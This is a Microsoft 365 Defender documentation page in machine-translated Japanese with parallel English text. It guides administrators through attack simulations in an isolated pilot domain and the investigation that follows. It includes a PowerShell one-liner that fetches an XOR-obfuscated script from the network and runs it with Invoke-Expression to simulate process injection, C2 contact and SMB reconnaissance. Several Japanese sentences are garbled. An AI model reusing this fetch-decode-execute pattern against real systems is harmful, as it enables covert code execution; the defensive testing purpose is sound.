---
title: パイロット環境、攻撃シミュレーション、応答、修復Microsoft 365 Defender分離された環境で攻撃シミュレーションを実行する
description: アラートとインシデントMicrosoft 365 Defender分析情報の取得、脅威の迅速な修復方法を確認するために、攻撃シミュレーションを実行します。
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: josephd
author: JoeDavies-MSFT
ms.date: 07/09/2021
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: ebea0a8eeed737712c55eb80b9ce3c68e06853c1
ms.sourcegitcommit: 718759c7146062841f7eb4a0a9a8bdddce0139b0
ms.translationtype: MT
ms.contentlocale: ja-JP
ms.lasthandoff: 07/15/2021
ms.locfileid: "53458147"
---
# <a name="run-an-attack-simulation-in-a-microsoft-365-defender-pilot-environment"></a><span data-ttu-id="b3c19-103">パイロット環境で攻撃シミュレーションMicrosoft 365 Defender実行する</span><span class="sxs-lookup"><span data-stu-id="b3c19-103">Run an attack simulation in a Microsoft 365 Defender pilot environment</span></span>


<span data-ttu-id="b3c19-104">この記事は、パイロット環境を使用してインシデントの調査と対応を実行するプロセスの手順[1](eval-defender-investigate-respond.md) Microsoft 365 Defenderです。</span><span class="sxs-lookup"><span data-stu-id="b3c19-104">This article is [Step 1 of 2](eval-defender-investigate-respond.md) in the process of performing an investigation and response of an incident in Microsoft 365 Defender using a pilot environment.</span></span> <span data-ttu-id="b3c19-105">このプロセスの詳細については、概要の記事を [参照](eval-defender-investigate-respond.md) してください。</span><span class="sxs-lookup"><span data-stu-id="b3c19-105">For more information about this process, see the [overview](eval-defender-investigate-respond.md) article.</span></span>

<span data-ttu-id="b3c19-106">パイロット環境を準備[](eval-defender-investigate-respond.md)した後、シミュレートされた攻撃でインシデントを作成し、Microsoft 365 Defender ポータルを使用して調査と対応を行って、Microsoft 365 Defender のインシデント対応と自動調査と修復機能をテストします。</span><span class="sxs-lookup"><span data-stu-id="b3c19-106">After preparing your [pilot environment](eval-defender-investigate-respond.md), it's time to test Microsoft 365 Defender's incident response and automated investigation and remediation capabilities by creating an incident with a simulated attack and using the Microsoft 365 Defender portal to investigate and respond.</span></span>

<span data-ttu-id="b3c19-107">インシデントは、Microsoft 365 Defenderのストーリーを構成する関連付けられたアラートと関連付けられたデータのコレクションです。</span><span class="sxs-lookup"><span data-stu-id="b3c19-107">An incident in Microsoft 365 Defender is a collection of correlated alerts and associated data that make up the story of an attack.</span></span>

<span data-ttu-id="b3c19-108">Microsoft 365やアプリは、疑わしいイベントや悪意のあるイベントやアクティビティを検出すると、アラートを作成します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-108">Microsoft 365 services and apps create alerts when they detect a suspicious or malicious event or activity.</span></span> <span data-ttu-id="b3c19-109">個々のアラートは、完了または継続的な攻撃に関する貴重な手がかりを提供します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-109">Individual alerts provide valuable clues about a completed or ongoing attack.</span></span> <span data-ttu-id="b3c19-110">ただし、攻撃は通常、デバイス、ユーザー、メールボックスなど、さまざまな種類のエンティティに対してさまざまな手法を採用します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-110">However, attacks typically employ various techniques against different types of entities, such as devices, users, and mailboxes.</span></span> <span data-ttu-id="b3c19-111">結果は、テナント内の複数のエンティティに対する複数の通知になります。</span><span class="sxs-lookup"><span data-stu-id="b3c19-111">The result is multiple alerts for multiple entities in your tenant.</span></span>

>[!Note]
><span data-ttu-id="b3c19-112">セキュリティ分析とインシデント対応が初めての場合は、「最初のインシデント[](first-incident-overview.md)に対応する」チュートリアルを参照して、分析、修復、インシデント後のレビューの一般的なプロセスのガイド付きツアーを取得してください。</span><span class="sxs-lookup"><span data-stu-id="b3c19-112">If you are brand new to security analysis and incident response, see the [Respond to your first incident walkthrough](first-incident-overview.md) to get a guided tour of a typical process of analysis, remediation, and post-incident review.</span></span>
>

## <a name="simulate-attacks-with-the-microsoft-365-defender-portal"></a><span data-ttu-id="b3c19-113">ポータルで攻撃をMicrosoft 365 Defenderする</span><span class="sxs-lookup"><span data-stu-id="b3c19-113">Simulate attacks with the Microsoft 365 Defender portal</span></span>

<span data-ttu-id="b3c19-114">このMicrosoft 365 Defenderには、パイロット環境に対するシミュレートされた攻撃を作成する組み込みの機能があります。</span><span class="sxs-lookup"><span data-stu-id="b3c19-114">The Microsoft 365 Defender portal has built-in capabilities to create simulated attacks on your pilot environment:</span></span>

- <span data-ttu-id="b3c19-115">で使用するMicrosoft 365 DefenderのOffice 365トレーニング [https://security.microsoft.com/attacksimulator](https://security.microsoft.com/attacksimulator) 。</span><span class="sxs-lookup"><span data-stu-id="b3c19-115">Attack simulation training for Microsoft 365 Defender for Office 365 at [https://security.microsoft.com/attacksimulator](https://security.microsoft.com/attacksimulator).</span></span>
  
  <span data-ttu-id="b3c19-116">[攻撃シミュレーション Microsoft 365 Defender] ポータルで、[メールの送信&**の>] を選択します**。</span><span class="sxs-lookup"><span data-stu-id="b3c19-116">In the Microsoft 365 Defender portal, select **Email & collaboration > Attack simulation training**.</span></span>

- <span data-ttu-id="b3c19-117">エンドポイントの&の攻撃Microsoft 365 Defenderのチュートリアル [https://security.microsoft.com/tutorials/simulations](https://security.microsoft.com/tutorials/simulations) です。</span><span class="sxs-lookup"><span data-stu-id="b3c19-117">Attack tutorials & simulations for Microsoft 365 Defender for Endpoints at [https://security.microsoft.com/tutorials/simulations](https://security.microsoft.com/tutorials/simulations).</span></span>

  <span data-ttu-id="b3c19-118">[ポータル] Microsoft 365 Defenderで、[エンドポイントとチュートリアル] >**シミュレーション&選択します**。</span><span class="sxs-lookup"><span data-stu-id="b3c19-118">In the Microsoft 365 Defender portal, select **Endpoints > Tutorials & simulations**.</span></span>

### <a name="defender-for-office-365-attack-simulation-training"></a><span data-ttu-id="b3c19-119">Defender for Office 365 攻撃シミュレーション トレーニング</span><span class="sxs-lookup"><span data-stu-id="b3c19-119">Defender for Office 365 Attack simulation training</span></span>

<span data-ttu-id="b3c19-120">セキュリティプラン 2 Office 365、Microsoft 365 E5 Microsoft Defender を使用する場合Office 365フィッシング攻撃に対する攻撃シミュレーション トレーニングが含まれます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-120">Defender for Office 365 with Microsoft 365 E5 or Microsoft Defender for Office 365 Plan 2 includes attack simulation training for phishing attacks.</span></span> <span data-ttu-id="b3c19-121">基本的な手順は次のとおりです。</span><span class="sxs-lookup"><span data-stu-id="b3c19-121">The basic steps are:</span></span>

1. <span data-ttu-id="b3c19-122">シミュレーションの作成</span><span class="sxs-lookup"><span data-stu-id="b3c19-122">Create a simulation</span></span>

   <span data-ttu-id="b3c19-123">新しいシミュレーションを作成して送信する方法の手順については、「フィッシング攻撃をシミュレートする [」を参照してください](/microsoft-365/security/office-365-security/attack-simulation-training)。</span><span class="sxs-lookup"><span data-stu-id="b3c19-123">For step by step instructions on how to create and send a new simulation, see [Simulate a phishing attack](/microsoft-365/security/office-365-security/attack-simulation-training).</span></span>

2. <span data-ttu-id="b3c19-124">ペイロードの作成</span><span class="sxs-lookup"><span data-stu-id="b3c19-124">Create a payload</span></span>

   <span data-ttu-id="b3c19-125">シミュレーション内で使用するペイロードを作成する方法の手順については、「Create a custom payload for Attack Simulation [training」を参照してください](/microsoft-365/security/office-365-security/attack-simulation-training-payloads)。</span><span class="sxs-lookup"><span data-stu-id="b3c19-125">For step by step instructions on how to create a payload for use within a simulation, see [Create a custom payload for Attack simulation training](/microsoft-365/security/office-365-security/attack-simulation-training-payloads).</span></span>

3. <span data-ttu-id="b3c19-126">分析情報の取得</span><span class="sxs-lookup"><span data-stu-id="b3c19-126">Gaining insights</span></span>

   <span data-ttu-id="b3c19-127">レポートで分析情報を得る方法の手順については、「攻撃シミュレーション トレーニングを通じてインサイトを得る [」を参照してください](/microsoft-365/security/office-365-security/attack-simulation-training-insights)。</span><span class="sxs-lookup"><span data-stu-id="b3c19-127">For step by step instructions on how to gain insights with reporting, see [Gain insights through Attack simulation training](/microsoft-365/security/office-365-security/attack-simulation-training-insights).</span></span>

<span data-ttu-id="b3c19-128">詳細については [、「Simulations」を参照してください](/microsoft-365/security/office-365-security/attack-simulation-training-get-started#simulations)。</span><span class="sxs-lookup"><span data-stu-id="b3c19-128">For more information, see [Simulations](/microsoft-365/security/office-365-security/attack-simulation-training-get-started#simulations).</span></span>

### <a name="defender-for-endpoint-attack-tutorials--simulations"></a><span data-ttu-id="b3c19-129">Defender for Endpoint attack tutorials &シミュレーション</span><span class="sxs-lookup"><span data-stu-id="b3c19-129">Defender for Endpoint attack tutorials & simulations</span></span>

<span data-ttu-id="b3c19-130">Microsoft の Defender for Endpoint シミュレーションを次に示します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-130">Here are the Defender for Endpoint simulations from Microsoft:</span></span>

- <span data-ttu-id="b3c19-131">ドキュメントドロップバックドア</span><span class="sxs-lookup"><span data-stu-id="b3c19-131">Document drops backdoor</span></span>
- <span data-ttu-id="b3c19-132">自動調査 (バックドア)</span><span class="sxs-lookup"><span data-stu-id="b3c19-132">Automated investigation (backdoor)</span></span>

<span data-ttu-id="b3c19-133">Attack IQ と SafeBreach から追加のシミュレーションがあります。</span><span class="sxs-lookup"><span data-stu-id="b3c19-133">There are additional simulations from Attack IQ and SafeBreach.</span></span> <span data-ttu-id="b3c19-134">一連のチュートリアルも用意されています。</span><span class="sxs-lookup"><span data-stu-id="b3c19-134">There are also a set of tutorials.</span></span>

<span data-ttu-id="b3c19-135">シミュレーションまたはチュートリアルごとに、次の値を使用します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-135">For each simulation or tutorial:</span></span>

1. <span data-ttu-id="b3c19-136">選択したシミュレーションまたはシナリオで提供されるドキュメントの対応するウォークスルーをダウンロードして読み取る。</span><span class="sxs-lookup"><span data-stu-id="b3c19-136">Download and read the corresponding walk through document provided with your selected simulation or scenario.</span></span>

2. <span data-ttu-id="b3c19-137">シミュレーション ファイルをダウンロードします。</span><span class="sxs-lookup"><span data-stu-id="b3c19-137">Download the simulation file.</span></span> <span data-ttu-id="b3c19-138">テスト デバイスでファイルまたはスクリプトをダウンロードすることもできますが、必須ではありません。</span><span class="sxs-lookup"><span data-stu-id="b3c19-138">You can choose to download the file or script on the test device but it's not mandatory.</span></span>

3. <span data-ttu-id="b3c19-139">ドキュメントの説明に従って、テスト デバイスでシミュレーション ファイルまたはスクリプトを実行します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-139">Run the simulation file or script on the test device as instructed in the walk through document.</span></span>

 <span data-ttu-id="b3c19-140">詳細については [、「Experience Microsoft Defender for Endpoint through シミュレートされた攻撃」を参照してください](/microsoft-365/security/defender-endpoint/attack-simulations)。</span><span class="sxs-lookup"><span data-stu-id="b3c19-140">For more information, see [Experience Microsoft Defender for Endpoint through simulated attack](/microsoft-365/security/defender-endpoint/attack-simulations).</span></span>

## <a name="simulate-an-attack-with-an-isolated-domain-controller-and-client-device-optional"></a><span data-ttu-id="b3c19-141">分離ドメイン コントローラーとクライアント デバイスを使用して攻撃をシミュレートする (オプション)</span><span class="sxs-lookup"><span data-stu-id="b3c19-141">Simulate an attack with an isolated domain controller and client device (optional)</span></span>

<span data-ttu-id="b3c19-142">このオプションのインシデント対応演習では、PowerShell スクリプトを使用して分離された Active Directory ドメイン サービス (AD DS) ドメイン コントローラーと Windows 10 デバイスに対する攻撃をシミュレートし、インシデントを調査、修復、解決します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-142">In this optional incident response exercise, you'll simulate an attack on an isolated Active Directory Domain Services (AD DS) domain controller and Windows 10 device using a PowerShell script and then investigate, remediate, and resolve the incident.</span></span>

<span data-ttu-id="b3c19-143">まず、パイロット環境にエンドポイントを追加する必要があります。</span><span class="sxs-lookup"><span data-stu-id="b3c19-143">First, you need to add endpoints to your pilot environment.</span></span>

### <a name="add-pilot-environment-endpoints"></a><span data-ttu-id="b3c19-144">パイロット環境エンドポイントの追加</span><span class="sxs-lookup"><span data-stu-id="b3c19-144">Add pilot environment endpoints</span></span>

<span data-ttu-id="b3c19-145">最初に、分離された DS ドメイン コントローラーとADデバイスをパイロット環境にWindows 10する必要があります。</span><span class="sxs-lookup"><span data-stu-id="b3c19-145">First, you need to add an isolated AD DS domain controller and a Windows 10 device to your pilot environment.</span></span>

1. <span data-ttu-id="b3c19-146">パイロット環境テナントが有効になっている[Microsoft 365 Defender。](m365d-enable.md#confirm-that-the-service-is-on)</span><span class="sxs-lookup"><span data-stu-id="b3c19-146">Verify your pilot environment tenant has [enabled Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).</span></span>

2. <span data-ttu-id="b3c19-147">ドメイン コントローラーが次の手順を実行します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-147">Verify that your domain controller:</span></span>

   - <span data-ttu-id="b3c19-148">Server 2008 R2 Windows以降のバージョンで実行されます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-148">Runs Windows Server 2008 R2 or a later version.</span></span>
   - <span data-ttu-id="b3c19-149">Id の [Microsoft Defender に報告し](/azure/security-center/security-center-wdatp) 、リモート管理 [を有効にしています](/windows-server/administration/server-manager/configure-remote-management-in-server-manager)。</span><span class="sxs-lookup"><span data-stu-id="b3c19-149">Reports to [Microsoft Defender for Identity](/azure/security-center/security-center-wdatp) and has enabled [remote management](/windows-server/administration/server-manager/configure-remote-management-in-server-manager).</span></span>
   - <span data-ttu-id="b3c19-150">[Microsoft Defender for Identity と Microsoft Cloud App Security有効](/cloud-app-security/mdi-integration)にします。</span><span class="sxs-lookup"><span data-stu-id="b3c19-150">Has [Microsoft Defender for Identity and Microsoft Cloud App Security integration](/cloud-app-security/mdi-integration) enabled.</span></span>
   - <span data-ttu-id="b3c19-151">テスト ドメインにテスト ユーザーが作成されています。</span><span class="sxs-lookup"><span data-stu-id="b3c19-151">Has a test user is created in the test domain.</span></span> <span data-ttu-id="b3c19-152">管理者レベルのアクセス許可は必要ではありません。</span><span class="sxs-lookup"><span data-stu-id="b3c19-152">Administrator-level permissions are not needed.</span></span>

3. <span data-ttu-id="b3c19-153">テスト デバイスが次の手順を実行します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-153">Verify that your test device:</span></span>

   - <span data-ttu-id="b3c19-154">バージョン 1903 Windows 10以降のバージョンで実行されます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-154">Runs Windows 10 version 1903 or a later version.</span></span>
   - <span data-ttu-id="b3c19-155">DS ドメイン コントローラー ドメインAD参加しています。</span><span class="sxs-lookup"><span data-stu-id="b3c19-155">Is joined to the AD DS domain controller domain.</span></span>
   - <span data-ttu-id="b3c19-156">有効[Windows Defender ウイルス対策](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)が設定されています。</span><span class="sxs-lookup"><span data-stu-id="b3c19-156">Has [Windows Defender Antivirus](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features) enabled.</span></span> <span data-ttu-id="b3c19-157">問題が発生した場合は、このトラブルシューティング Windows Defender ウイルス対策を[参照してください](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)。</span><span class="sxs-lookup"><span data-stu-id="b3c19-157">If you are having trouble enabling Windows Defender Antivirus, see this [troubleshooting topic](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>
   - <span data-ttu-id="b3c19-158">Microsoft [Defender for Endpoint にオンボードされています](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)。</span><span class="sxs-lookup"><span data-stu-id="b3c19-158">Is [onboarded to Microsoft Defender for Endpoint](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

<span data-ttu-id="b3c19-159">テナントグループとデバイス グループを使用する場合は、テスト デバイス用の専用デバイス グループを作成し、それをトップ レベルにプッシュします。</span><span class="sxs-lookup"><span data-stu-id="b3c19-159">If you use tenant and device groups, create a dedicated device group for the test device and push it to top level.</span></span>

<span data-ttu-id="b3c19-160">1 つの方法は、AD DS ドメイン コントローラーとテスト デバイスを仮想マシンとしてホストMicrosoft Azure方法です。</span><span class="sxs-lookup"><span data-stu-id="b3c19-160">One alternative is to host your AD DS domain controller and test device as virtual machines in Microsoft Azure infrastructure services.</span></span> <span data-ttu-id="b3c19-161">シミュレートされたエンタープライズ テスト ラボ ガイドのフェーズ [1](/microsoft-365/enterprise/simulated-ent-base-configuration-microsoft-365-enterprise#phase-1-create-a-simulated-intranet)の手順を使用できますが、APP1 仮想マシンの作成は省略できます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-161">You can use the instructions in [Phase 1 of the simulated enterprise Test Lab Guide](/microsoft-365/enterprise/simulated-ent-base-configuration-microsoft-365-enterprise#phase-1-create-a-simulated-intranet), but skip the creation of the APP1 virtual machine.</span></span>

<span data-ttu-id="b3c19-162">結果を次に示します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-162">Here is the result.</span></span>

![シミュレートされたエンタープライズ テスト ラボ ガイドを使用した Defender 評価環境のエンドポイント](../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png)

<span data-ttu-id="b3c19-164">高度な手法を使用して検出を非表示にする高度な攻撃をシミュレートします。</span><span class="sxs-lookup"><span data-stu-id="b3c19-164">You'll simulate a sophisticated attack that leverages advanced techniques to hide from detection.</span></span> <span data-ttu-id="b3c19-165">この攻撃は、ドメイン コントローラーで開いたサーバー メッセージ ブロック (SMB) セッションを列挙し、ユーザーのデバイスの最近の IP アドレスを取得します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-165">The attack enumerates opened Server Message Block (SMB) sessions on domain controllers and retrieves recent IP addresses of users' devices.</span></span> <span data-ttu-id="b3c19-166">攻撃のこのカテゴリは、通常、被害者のデバイスにドロップされたファイルを含め、メモリ内でのみ発生します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-166">This category of attacks usually doesn't include files dropped on the victim's device and they occur solely in memory.</span></span> <span data-ttu-id="b3c19-167">既存のシステムツールと管理ツールを使用して"土地から離れ"、コードをシステム プロセスに挿入して実行を非表示にします。</span><span class="sxs-lookup"><span data-stu-id="b3c19-167">They "live off the land" by using existing system and administrative tools and inject their code into system processes to hide their execution.</span></span> <span data-ttu-id="b3c19-168">このような動作により、検出を回避し、デバイス上で保持できます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-168">Such behavior allows them to evade detection and persist on the device.</span></span>

<span data-ttu-id="b3c19-169">このシミュレーションでは、サンプル シナリオは PowerShell スクリプトから始まります。</span><span class="sxs-lookup"><span data-stu-id="b3c19-169">In this simulation, our sample scenario starts with a PowerShell script.</span></span> <span data-ttu-id="b3c19-170">実際には、ユーザーがスクリプトの実行を騙される可能性があります。または、以前に感染したデバイスから別のコンピューターへのリモート接続からスクリプトが実行される可能性があります。これは、攻撃者がネットワーク内で横方向に移動しようとした可能性があります。</span><span class="sxs-lookup"><span data-stu-id="b3c19-170">In the real world, a user might be tricked into running a script or the script might run from a remote connection to another computer from a previously infected device, which indicates that the attacker is attempting to move laterally in the network.</span></span> <span data-ttu-id="b3c19-171">管理者は、さまざまな管理アクティビティを実行するためにリモートでスクリプトを実行する場合も多いので、これらのスクリプトの検出が困難になる場合があります。</span><span class="sxs-lookup"><span data-stu-id="b3c19-171">Detection of these scripts can be difficult because administrators also often run scripts remotely to carry out various administrative activities.</span></span>

![プロセスの挿入と SMB の偵察攻撃の図によるファイルレス PowerShell 攻撃](../../media/mtp/mtpdiydiagram.png)

<span data-ttu-id="b3c19-173">シミュレーション中、攻撃はシェルコードを一見無実のプロセスに挿入します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-173">During the simulation, the attack injects shellcode into a seemingly innocent process.</span></span> <span data-ttu-id="b3c19-174">このシナリオでは、このシナリオを使用notepad.exe。</span><span class="sxs-lookup"><span data-stu-id="b3c19-174">The scenario requires the use of notepad.exe.</span></span> <span data-ttu-id="b3c19-175">シミュレーションではこのプロセスを選択しましたが、攻撃者は長時間実行されるシステム プロセス (たとえば、svchost.exe) をターゲットにしている可能性が高svchost.exe。</span><span class="sxs-lookup"><span data-stu-id="b3c19-175">We chose this process for the simulation, but attackers would more likely target a long-running system process, such as svchost.exe.</span></span> <span data-ttu-id="b3c19-176">その後、シェルコードは攻撃者のコマンド アンド コントロール (C2) サーバーに問い合わせ、続行方法に関する指示を受け取る。</span><span class="sxs-lookup"><span data-stu-id="b3c19-176">The shellcode then goes on to contact the attacker's command-and-control (C2) server to receive instructions on how to proceed.</span></span> <span data-ttu-id="b3c19-177">スクリプトは、ドメイン コントローラー (DC) に対する偵察クエリの実行を試みます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-177">The script attempts executing reconnaissance queries against the domain controller (DC).</span></span> <span data-ttu-id="b3c19-178">偵察により、攻撃者は最近のユーザー ログイン情報に関する情報を取得できます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-178">Reconnaissance allows an attacker to get information about recent user login information.</span></span> <span data-ttu-id="b3c19-179">攻撃者がこの情報を取得すると、ネットワーク内を横方向に移動して、特定の機密性の高いアカウントにアクセスできます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-179">Once attackers have this information, they can move laterally in the network to get to a specific sensitive account</span></span>

> [!IMPORTANT]
> <span data-ttu-id="b3c19-180">最適な結果を得る場合は、可能な限り攻撃シミュレーションの指示に従ってください。</span><span class="sxs-lookup"><span data-stu-id="b3c19-180">For optimum results, follow the attack simulation instructions as closely as possible.</span></span>

### <a name="run-the-isolated-ad-ds-domain-controller-attack-simulation"></a><span data-ttu-id="b3c19-181">分離された DS ドメイン AD攻撃シミュレーションを実行する</span><span class="sxs-lookup"><span data-stu-id="b3c19-181">Run the isolated AD DS domain controller attack simulation</span></span>

<span data-ttu-id="b3c19-182">攻撃シナリオのシミュレーションを実行するには、次のコマンドを実行します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-182">To run the attack scenario simulation:</span></span>

1. <span data-ttu-id="b3c19-183">パイロット環境に、分離された DS ドメイン コントローラーとADデバイスが含Windows 10してください。</span><span class="sxs-lookup"><span data-stu-id="b3c19-183">Ensure that your pilot environment includes the isolated AD DS domain controller and Windows 10 device.</span></span>

2. <span data-ttu-id="b3c19-184">テスト ユーザー アカウントを使用してテスト デバイスにサインインします。</span><span class="sxs-lookup"><span data-stu-id="b3c19-184">Sign in to the test device with the test user account.</span></span>

3. <span data-ttu-id="b3c19-185">テスト デバイスWindows PowerShellウィンドウを開きます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-185">Open a Windows PowerShell window on the test device.</span></span>

4. <span data-ttu-id="b3c19-186">次のシミュレーション スクリプトをコピーします。</span><span class="sxs-lookup"><span data-stu-id="b3c19-186">Copy the following simulation script:</span></span>

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > <span data-ttu-id="b3c19-187">この記事を Web ブラウザーで開いた場合は、特定の文字を失わずに、または改行を追加せずにフル テキストをコピーする際に問題が発生する可能性があります。</span><span class="sxs-lookup"><span data-stu-id="b3c19-187">If you open this article on a web browser, you might encounter problems copying the full text without losing certain characters or introducing extra line breaks.</span></span> <span data-ttu-id="b3c19-188">この場合は、このドキュメントをダウンロードして Adobe Reader で開きます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-188">If this is the case, download this document and open it on Adobe Reader.</span></span>

5. <span data-ttu-id="b3c19-189">コピーしたスクリプトを PowerShell ウィンドウに貼り付け、実行します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-189">Paste and run the copied script in the PowerShell window.</span></span>

> [!NOTE]
> <span data-ttu-id="b3c19-190">リモート デスクトップ プロトコル (RDP) を使用して PowerShell を実行している場合は **、CTRL-V** ホットキーまたは右クリック貼り付けメソッドが機能しないので、RDP クライアントで [クリップボード テキストの種類] コマンドを使用します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-190">If you're running PowerShell using remote desktop protocol (RDP), use the Type Clipboard Text command in the RDP client because the **CTRL-V** hotkey or right-click-paste method might not work.</span></span> <span data-ttu-id="b3c19-191">PowerShell の最近のバージョンでは、そのメソッドを受け入れれなく場合があります。最初にメモリ内の メモ帳 にコピーし、仮想マシンにコピーしてから PowerShell に貼り付ける必要があります。</span><span class="sxs-lookup"><span data-stu-id="b3c19-191">Recent versions of PowerShell sometimes will also not accept that method, you might have to copy to Notepad in memory first, copy it in the virtual machine, and then paste it into PowerShell.</span></span>

<span data-ttu-id="b3c19-192">数秒後、アプリメモ帳開きます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-192">A few seconds later, the Notepad app will open.</span></span> <span data-ttu-id="b3c19-193">シミュレートされた攻撃コードは、そのコードにメモ帳。</span><span class="sxs-lookup"><span data-stu-id="b3c19-193">A simulated attack code will be injected into Notepad.</span></span> <span data-ttu-id="b3c19-194">完全なシナリオを体験するためにメモ帳自動的に生成されたインスタンスを開いた状態に保ちます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-194">Keep the automatically generated Notepad instance open to experience the full scenario.</span></span>

<span data-ttu-id="b3c19-195">シミュレートされた攻撃コードは、外部 IP アドレス (C2 サーバーのシミュレート) に通信し、SMB を介してドメイン コントローラーに対する偵察を試みる。</span><span class="sxs-lookup"><span data-stu-id="b3c19-195">The simulated attack code will attempt to communicate to an external IP address (simulating the C2 server) and then attempt reconnaissance against the domain controller through SMB.</span></span>

<span data-ttu-id="b3c19-196">このスクリプトが完了すると、このメッセージが PowerShell コンソールに表示されます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-196">You'll see this message displayed on the PowerShell console when this script completes:</span></span>

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

<span data-ttu-id="b3c19-197">[インシデントと応答の自動化] 機能が動作しているのを確認するには、プロセスを開notepad.exe保持します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-197">To see the Automated Incident and Response feature in action, keep the notepad.exe process open.</span></span> <span data-ttu-id="b3c19-198">[インシデントと応答の自動停止] プロセスが表示メモ帳表示されます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-198">You'll see Automated Incident and Response stop the Notepad process.</span></span>

### <a name="investigate-the-incident-for-the-simulated-attack"></a><span data-ttu-id="b3c19-199">シミュレートされた攻撃のインシデントを調査する</span><span class="sxs-lookup"><span data-stu-id="b3c19-199">Investigate the incident for the simulated attack</span></span>

> [!NOTE]
> <span data-ttu-id="b3c19-200">このシミュレーションを実行する前に、次のビデオを見て、インシデント管理が関連するアラートを調査プロセスの一部としてまとめ、ポータルで見つけ、セキュリティ操作でどのように役立つのかについて説明します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-200">Before we walk you through this simulation, watch the following video to see how incident management helps you piece the related alerts together as part of the investigation process, where you can find it in the portal, and how it can help you in your security operations:</span></span>

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

<span data-ttu-id="b3c19-201">SOC アナリストの視点に切り替えて、このポータルで攻撃の調査Microsoft 365 Defenderできます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-201">Switching to the SOC analyst point of view, you can now start to investigate the attack in the Microsoft 365 Defender portal.</span></span>

1. <span data-ttu-id="b3c19-202">ポータルを[開Microsoft 365 Defenderします](https://security.microsoft.com/)。</span><span class="sxs-lookup"><span data-stu-id="b3c19-202">Open the [Microsoft 365 Defender portal](https://security.microsoft.com/).</span></span>

2. <span data-ttu-id="b3c19-203">ナビゲーション ウィンドウで、[インシデント] を選択 **し、[インシデント&通知>選択します**。</span><span class="sxs-lookup"><span data-stu-id="b3c19-203">From the navigation pane, select **Incidents & Alerts > Incidents**.</span></span>

3. <span data-ttu-id="b3c19-204">シミュレートされた攻撃の新しいインシデントがインシデント キューに表示されます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-204">The new incident for the simulated attack will appear in the incident queue.</span></span>

    ![インシデント キューの例](../../media/mtp/fig2.png)

#### <a name="investigate-the-attack-as-a-single-incident"></a><span data-ttu-id="b3c19-206">攻撃を 1 つのインシデントとして調査する</span><span class="sxs-lookup"><span data-stu-id="b3c19-206">Investigate the attack as a single incident</span></span>

<span data-ttu-id="b3c19-207">Microsoft 365 Defender分析を関連付け、異なる製品のすべての関連するアラートと調査を 1 つのインシデント エンティティに集約します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-207">Microsoft 365 Defender correlates analytics and aggregates all related alerts and investigations from different products into one incident entity.</span></span> <span data-ttu-id="b3c19-208">これにより、SOC アナリストMicrosoft 365 Defender複雑な脅威を理解して対応できるように、より広範な攻撃ストーリーが表示されます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-208">By doing so, Microsoft 365 Defender shows a broader attack story, allowing the SOC analyst to understand and respond to complex threats.</span></span>

